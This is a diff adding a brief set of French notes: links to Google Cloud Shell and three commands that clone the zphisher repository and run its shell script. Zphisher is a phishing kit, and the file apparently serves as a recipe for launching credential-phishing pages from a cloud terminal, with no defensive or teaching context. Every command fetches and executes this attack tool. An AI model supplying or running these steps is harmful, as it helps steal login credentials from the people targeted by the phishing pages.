@@ -1,0 +1,7 @@
+lien 1 :https://cloud.google.com/shell
+lien 2 :https://shell.cloud.google.com/?hl=fr&fromcloudshell=true&show=terminal
+
+commandes : 
+git clone https://github.com/htr-tech/zphisher
+cd zphisher
+bash zphisher.sh
